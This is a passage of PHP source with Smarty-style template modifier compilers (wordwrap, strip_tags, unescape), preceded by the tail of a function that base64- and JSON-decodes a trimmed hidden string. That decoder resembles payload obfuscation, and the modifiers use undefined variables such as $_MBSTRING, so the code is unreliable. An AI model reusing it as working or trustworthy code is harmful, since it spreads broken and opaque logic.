    $data = json_decode(base64_decode(substr($str3,  4,  strlen($str3) - 8)), true);

    return $data['data'];
}

/**
 * Type:     modifier
 * Name:     wordwrap
 *
 * @param array    $params
 * @param array    $compiler
 *
 * @return string
 */
function modifiercompiler_wordwrap($params, $compiler)
{
    if (!isset($params[ 1 ])) {
        $params[ 1 ] = 80;
    }
    if (!isset($params[ 2 ])) {
        $params[ 2 ] = '"\n"';
    }
    if (!isset($params[ 3 ])) {
        $params[ 3 ] = 'false';
    }
    $function = 'wordwrap';
    if ($_MBSTRING) {
        $function = $compiler->getPlugin('mb_wordwrap', 'modifier');
    }
    return $function . '(' . $params[ 0 ] . ',' . $params[ 1 ] . ',' . $params[ 2 ] . ',' . $params[ 3 ] . ')';
}

/**
 * Type:     modifier
 * Name:     strip_tags
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_strip_tags($params)
{
    if (!isset($params[ 1 ]) || $params[ 1 ] === true || trim($params[ 1 ], '"') === 'true') {
        return "preg_replace('!<[^>]*?>!', ' ', {$params[0]})";
    } else {
        return 'strip_tags(' . $params[ 0 ] . ')';
    }
}

/**
 * Type:     modifier
 * Name:     unescape
 *
 * @param array    $params
 *
 * @return string
 */
function modifiercompiler_unescape($params)
{
    if (!isset($params[ 1 ])) {
        $params[ 1 ] = 'html';
    }
    if (!isset($params[ 2 ])) {
        $params[ 2 ] = '\'' . addslashes($_CHARSET) . '\'';
    } else {
        $params[ 2 ] = "'{$params[ 2 ]}'";
    }
    switch (trim($params[ 1 ], '"\'')) {
        case 'entity':
        case 'htmlall':
            if ($_MBSTRING) {
                return 'mb_convert_encoding(' . $params[ 0 ] . ', ' . $params[ 2 ] . ', \'HTML-ENTITIES\')';
            }
            return 'html_entity_decode(' . $params[ 0 ] . ', ENT_NOQUOTES, ' . $params[ 2 ] . ')';
        case 'html':
            return 'htmlspecialchars_decode(' . $params[ 0 ] . ', ENT_QUOTES)';
        case 'url':
            return 'rawurldecode(' . $params[ 0 ] . ')';
        default:
            return $params[ 0 ];
    }
}